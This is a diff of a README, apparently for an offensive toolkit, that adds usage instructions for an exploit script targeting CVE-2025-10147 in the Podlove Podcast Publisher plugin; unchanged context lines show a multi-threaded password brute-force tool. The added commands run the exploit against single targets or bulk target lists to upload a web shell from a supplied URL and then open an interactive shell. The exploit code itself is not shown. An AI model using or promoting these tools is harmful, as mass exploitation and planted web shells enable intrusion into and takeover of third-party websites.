@@ -39,3 +39,23 @@ Example:
 
 	python3 brute.py -l domains.txt -p passwords.txt -o hasil.txt -t 10
 
+
+
+=============================================================
+
+**CVE-2025-10147_Podlove Podcast Publisher**
+
+Script ini untuk kerentanan di **CVE-2025-10147** dimana cara menjalankannya seperti di bawah !
+
+
+Single Target:
+
+	python3 exploit.py -u (target) -s (shell url) --filename (shell name)
+
+Mass / Bulk Target:
+
+	python3 exploit.py -f (file target) -s (shell url) -o (result target) --filename (shell name) -t (threads)
+
+Interactive Shell :
+
+	python3 exploit.py --shell-url (target with full shell url)
